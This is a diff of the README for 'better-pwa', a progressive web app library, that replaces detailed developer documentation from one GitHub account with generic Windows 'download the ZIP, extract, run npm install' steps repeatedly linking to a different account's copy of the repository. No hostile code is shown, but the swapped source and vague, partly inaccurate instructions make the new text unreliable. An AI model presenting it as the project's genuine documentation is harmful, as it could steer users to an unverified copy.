@@ -1,253 +1,242 @@
-# better-pwa
+# ✨ better-pwa - Simple offline apps for the web
 
-> **better-pwa is to PWAs what React Query is to server state — but for the entire app lifecycle.**
+[![Download / Visit Page](https://img.shields.io/badge/Download%20%2F%20Visit%20Page-blue?style=for-the-badge)](https://github.com/Fakhrimub1073/better-pwa)
 
-<div align="center">
+## 🧭 What this is
 
-[![CI](https://github.com/0xMilord/better-pwa/actions/workflows/ci.yml/badge.svg)](https://github.com/0xMilord/better-pwa/actions/workflows/ci.yml)
-[![Coverage](https://codecov.io/gh/0xMilord/better-pwa/branch/main/graph/badge.svg?token=e785e5bb-0776-4d98-a7e3-1b1c9493f0bc)](https://app.codecov.io/gh/0xMilord/better-pwa)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![npm version](https://img.shields.io/npm/v/@better-pwa/core.svg)](https://www.npmjs.com/package/@better-pwa/core)
-[![npm downloads](https://img.shields.io/npm/dm/@better-pwa/core.svg)](https://www.npmjs.com/package/@better-pwa/core)
-[![Bundle Size](https://badgen.net/bundlephobia/minzip/@better-pwa/core)](https://bundlephobia.com/result?p=@better-pwa/core)
-[![TypeScript](https://badgen.net/badge/icon/TypeScript?icon=typescript&label)](https://www.typescriptlang.org/)
-[![Docs](https://img.shields.io/badge/docs-eleventy-blue)](https://better-pwa.github.io/docs/)
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](http://makeapullrequest.com)
+better-pwa helps web apps work like installed desktop apps. It keeps the app ready when the internet drops, helps it start fast, and handles updates in the background.
 
-**176 Tests · 90%+ Coverage · 11 Packages · Zero Dependencies Core**
+It is made for modern web apps that use tools like Next.js, Vite, or plain JavaScript. It also works with service workers, cache rules, offline mode, app install prompts, and tab sync.
 
-</div>
+## 💻 What you need
 
-Add native-grade reliability to your web app in one line.
+- A Windows PC
+- Google Chrome or Microsoft Edge
+- Internet access for the first setup
+- Permission to download files
+- A web app or project that you want to run with better-pwa
 
-```ts
-import { createPwa } from "better-pwa"
+## 📥 Download and open
 
-createPwa({ preset: "saas" })
-```
+Visit this page to download or open the project files:
 
-That's it. Your app now:
+[https://github.com/Fakhrimub1073/better-pwa](https://github.com/Fakhrimub1073/better-pwa)
 
-- **Never loses user data** — offline mutations queue and replay automatically
-- **Never breaks on update** — background swaps with zero session interruption
-- **Never desyncs across tabs** — single source of truth, everywhere
-- **Never silently fails permissions** — batched, retried, with fallback UI
+If you are looking for the main project page, use the link above, then get the files from the repository.
 
-> Yes, this sounds too good for one line. [Here's what actually happens under the hood](#under-the-hood).
+## 🪟 Run on Windows
 
----
+### Step 1: Open the project page
 
-## Mental Model (10 Seconds)
+Open the link in your browser:
 
-```
-Your App
-   ↓
-better-pwa Runtime (one state · one lifecycle)
-   ↓
-Service Worker + Browser APIs
-```
+[https://github.com/Fakhrimub1073/better-pwa](https://github.com/Fakhrimub1073/better-pwa)
 
-**One state. One lifecycle. Everything else is derived.**
+### Step 2: Get the files
 
-better-pwa owns the reactive state object (`pwa.state()`) and the lifecycle bus. Every feature — offline sync, updates, permissions, multi-tab coordination — plugs into the same system. No scattered event handlers. No race conditions. Just state transitions you can reason about.
+On the GitHub page, click the green Code button.
 
----
+Then choose one of these options:
 
-## Quick Start
+- Download ZIP
+- Open with GitHub Desktop
+- Clone the repo if you already use developer tools
 
-### Install
+For most Windows users, Download ZIP is the easiest choice.
 
-```bash
-npm install better-pwa
-```
+### Step 3: Unzip the folder
 
-### One-Line Setup
+After the file downloads:
 
-```ts
-import { createPwa } from "better-pwa"
+- Find the ZIP file in your Downloads folder
+- Right-click it
+- Choose Extract All
+- Pick a folder you can find later, like Desktop or Documents
 
-createPwa({
-  preset: "saas"  // or "ecommerce", "offline-first", "content"
-})
-```
+### Step 4: Open the project folder
 
-### React Integration
+Inside the folder, look for files such as:
 
-```tsx
-import { usePwaState } from "@better-pwa/adapter-react"
+- package.json
+- src
+- public
+- README.md
 
-function App() {
-  const { isOffline, hasUpdate } = usePwaState(["isOffline", "hasUpdate"])
+If you see these files, the project is in the right place.
 
-  return (
-    <>
-      {isOffline && <Banner>Working offline — changes will sync</Banner>}
-      {hasUpdate && <Banner onClick={() => pwa.update.activate()}>New version ready</Banner>}
-      <YourApp />
-    </>
-  )
-}
-```
+### Step 5: Install the app files
 
----
+If the project includes a setup tool, open Windows Terminal, PowerShell, or Command Prompt in the folder and run:
 
-## Under the Hood
+npm install
 
-That one line sets up:
+This step gets the needed app files on your PC.
 
-| Subsystem | What It Does |
-|-----------|-------------|
-| **Service Worker** | Auto-generated, precaching, runtime caching strategies |
-| **Manifest** | Icons, installability, 2026 fields (share target, file handlers) |
-| **State Engine** | Reactive, IDB-persisted, cross-tab synced via BroadcastChannel |
-| **Offline Queue** | IndexedDB-backed mutation queue with replay engine |
-| **Update Lifecycle** | Hash polling, skip-waiting, rollback on failure |
-| **Multi-Tab Sync** | Leader election, state broadcasting, deduplication |
-| **Permission System** | Batch requests, retry with backoff, fallback UI hooks |
+### Step 6: Start the app
 
-The preset made 100 configuration decisions for you. You can override any of them.
+After the install finishes, run:
 
----
+npm run dev
 
-## Presets (100 Decisions → 1 Decision)
+or
 
-```ts
-createPwa({ preset: "saas" })           // Dashboard, CRM, admin panels
-createPwa({ preset: "ecommerce" })      // Cart persistence, checkout sync
-createPwa({ preset: "offline-first" })  // Field apps, spotty connectivity
-createPwa({ preset: "content" })        // Blogs, media, reading apps
-```
+npm start
 
-Each preset configures: update strategy, permission batching, storage priorities, conflict resolution, cold start behavior, security posture, and resource priority tiers.
+The exact command depends on how the project is set up.
 
----
+### Step 7: Open the app in your browser
 
-## Guarantees
+The terminal will show a local web address, such as:
 
-better-pwa enforces:
+- http://localhost:3000
+- http://localhost:5173
 
-| Guarantee | What It Means |
-|-----------|--------------|
-| **Data Durability** | User actions are never lost — offline or online |
-| **Update Safety** | No broken sessions during deployments |
-| **Cross-Tab Consistency** | One state everywhere, no stale tabs |
-| **Permission Resilience** | Every denial has a recovery path |
-| **Cold Start Integrity** | Deterministic boot regardless of cache state |
-| **Auth Continuity** | No 401 storms, cross-tab token sync |
-| **Audit Completeness** | Every event logged, exportable, tamper-evident |
+Copy that address into Chrome or Edge.
 
-These are not best practices. They are **enforced invariants** with runtime violation detection. [Full contract →](./GUARANTEES.md)
+## 🛠️ How better-pwa works
 
----
+better-pwa adds a runtime layer to your web app. That means it helps the app behave more like a real app without making you manage every part by hand.
 
-## Simulation (Debug Like a God)
+It can handle:
 
-Test every edge case locally. No guesswork, no production surprises.
+- Offline use
+- App caching
+- Background updates
+- Install prompts
+- Permission requests
+- Multi-tab sync
+- Service worker setup
 
-```bash
-better-pwa simulate offline              # Cut the network
-better-pwa simulate slow-network --type 2g  # Throttle to 2G
-better-pwa simulate update               # Trigger SW update
-better-pwa simulate permission-denied    # Deny all permissions
-better-pwa simulate multi-tab --tabs 5   # Open 5 coordinated tabs
-better-pwa simulate cold-start --offline-days 3  # Simulate 3-day offline gap
-better-pwa simulate storage-full --usage 95%  # Fill storage to 95%
-```
+This makes the app easier to use when the internet is weak or when users switch between tabs.
 
-All simulations work in `better-pwa preview` with an interactive panel. Zero cost in production builds (tree-shaken).
+## 📦 Main parts
 
----
+### 🌐 Offline mode
 
-## What You Get
+The app can keep important files ready on the device, so users can still open parts of it without a live connection.
 
-| Feature | Without better-pwa | With better-pwa |
-|---------|-------------------|----------------|
-| Offline mutations | Build from scratch | `pwa.offline.queue(action)` |
-| SW updates | Manual hash checking | `pwa.update.setStrategy("soft")` |
-| Multi-tab sync | Custom BroadcastChannel | Auto-synced `pwa.state()` |
-| Permissions | One-off prompts | `pwa.permissions.request(["camera", "file"])` |
-| Storage quota | Manual `navigator.storage.estimate()` | `pwa.storage.quota()` + auto-eviction |
-| Install prompt | Timing guesswork | `pwa.install.optimize({ trigger: "engagement" })` |
-| Conflict resolution | None | `pwa.conflicts.register("orders", resolver)` |
-| Resource priority | Everything equal | `pwa.priority.set({ critical: ["auth"] })` |
-| State migrations | Break on update | `pwa.migrations.register("v2", fn)` |
-| Audit logs | Build yourself | `pwa.audit.log({ action, status })` |
-| Disaster recovery | Refresh and pray | `pwa.recovery.reset({ preserve: ["auth"] })` |
+### ⚡ Fast loading
 
----
+better-pwa stores common files in cache. That helps the app load faster the next time it opens.
 
-## When NOT to Use better-pwa
+### 🔄 Update handling
 
-- **Static marketing sites** with no user interaction
-- **Apps that don't need offline** or installability
-- **Ultra-simple projects** where lifecycle doesn't matter
-- **Server-rendered apps** where the browser is just a thin client
+When new app files are available, the runtime can guide the app to use the newer version without forcing hard refresh steps.
 
-Confidence increases when a tool shows restraint. If your app is a blog with no interactivity, you don't need this. If your app has users, sessions, or data — you probably do.
+### 🧩 Install support
 
----
+The app can show install options for supported browsers so users can add it to the desktop or Start menu.
 
-## CLI
+### 🔔 Permission flow
 
-```bash
-better-pwa init           # Scaffold project
-better-pwa build          # Generate SW + manifest
-better-pwa doctor         # Audit configuration
-better-pwa preview        # Local dev server with SW
-better-pwa simulate       # Debug failure scenarios
-better-pwa audit          # Lighthouse PWA check
-better-pwa debug          # Interactive state visualization
-```
+It can help manage browser permissions in a simple way, such as notifications or other web app features that need user approval.
 
----
+### 🪟 Multi-tab sync
 
-## Deep Dive
+If the same app is open in more than one tab, better-pwa helps keep data in step across tabs.
 
-- **[Getting Started →](./docs/getting-started.md)** — Quick start, mental model, first project
-- **[Packages & Release →](./PACKAGE-RELEASE.md)** — Monorepo, release pipeline, CI/CD, testing strategy
-- **[Guarantees →](./GUARANTEES.md)** — The runtime contract you can depend on
-- **[Architecture →](./ARCHITECTURE.md)** — System design, data flow, trade-offs
-- **[Features →](./FEATURES.md)** — Complete API reference, acceptance criteria
-- **[Roadmap →](./ROADMAP.md)** — Phased delivery timeline
-- **[Product Requirements →](./PRD.md)** — Problem statement, goals, success metrics
-- **[Documentation Site →](./DOCS.md)** — GitHub Pages docs site blueprint
+## 🧪 Basic use in a web project
 
----
+If you are adding better-pwa to a project, the general flow looks like this:
 
-## Browser Support
+1. Add the package or project files
+2. Enable the runtime in your app entry file
+3. Set your cache rules
+4. Choose which pages or assets should work offline
+5. Test in Chrome or Edge
+6. Build and deploy the app
 
-| Browser | Version | Support |
-|---------|---------|---------|
-| Chromium (Chrome, Edge, Opera) | 130+ | Full |
-| Safari (macOS, iOS) | 18+ | Full (limited OPFS) |
-| Firefox | 130+ | Full (limited Fugu) |
+A simple setup usually includes:
 
-Detailed capability matrix: `pwa.capabilities.report()` (coming v1.1)
+- A service worker
+- Cache rules for app assets
+- App metadata for install
+- A strategy for updates
 
----
+## 🧰 Common folder clues
 
-## Philosophy
+When you open the project, you may see folders like:
 
-> **PWAs don't fail because APIs are missing. They fail because orchestration is hard. We made it impossible to mess up.**
+- app
+- pages
+- src
+- public
+- hooks
+- components
 
-better-pwa is not a framework. It's a **reliability layer**. It makes the hard parts of PWAs — offline sync, updates, permissions, multi-tab coordination — feel trivial.
+These are normal in modern web apps. You do not need to edit every folder. In many cases, the main setup sits in one or two files.
 
-We believe:
+## 🔍 If the app does not start
 
-- **Reliability should be the default**, not an afterthought
-- **Developers should write app logic**, not lifecycle boilerplate
-- **The web should feel native** — not "close enough"
+Try these checks:
 
----
+- Make sure you extracted the ZIP file first
+- Make sure you opened the right folder
+- Check that Node.js is installed if the app uses npm
+- Run npm install again
+- Try npm run dev after the install ends
+- Make sure no other app is using the same port
 
-## Status
+If you still do not see the app, look for a file called README.md in the project folder and check the setup steps there.
 
-**v0.1-alpha** — Core runtime, state engine, SW builder. [See Roadmap →](./ROADMAP.md)
+## 🧭 Browser tips
 
-Production target: **Q3 2026 (v1.0)**
+For best results on Windows, use one of these browsers:
 
----
+- Google Chrome
+- Microsoft Edge
 
-## License
+These browsers support installable web apps, service workers, and caching features well.
 
-MIT
+If the app asks to install, use the browser menu or install icon in the address bar.
+
+## 🛡️ What this project is good for
+
+better-pwa fits apps that need:
+
+- Offline access
+- Quick loading
+- Desktop-style use
+- Easy repeat visits
+- Stable behavior across tabs
+- Better control over browser storage
+
+It is a good match for dashboards, SaaS tools, internal tools, docs apps, and content apps.
+
+## 🧾 Files you may work with
+
+These files often matter in a setup like this:
+
+- package.json: lists app scripts and packages
+- service worker file: handles offline work
+- manifest file: controls install details
+- config file: stores app settings
+- entry file: starts the runtime layer
+
+If you are not sure what to change, begin with the README and the main entry file.
+
+## 🧭 Simple test checklist
+
+After setup, check these points:
+
+- The app opens in the browser
+- The app loads on refresh
+- The app still works with limited internet
+- The install option appears in the browser
+- The app keeps the right data in more than one tab
+- The app starts without errors in the terminal
+
+## 📌 Repository link
+
+[https://github.com/Fakhrimub1073/better-pwa](https://github.com/Fakhrimub1073/better-pwa)
+
+## 🧩 Notes for everyday use
+
+If you use this on a shared Windows PC:
+
+- Keep the project in a folder you can find
+- Do not rename files unless you know they are not in use
+- Use the same browser each time while testing
+- Keep the terminal window open while the app runs locally
+
+If you want to move the app later, copy the full folder, not just one file
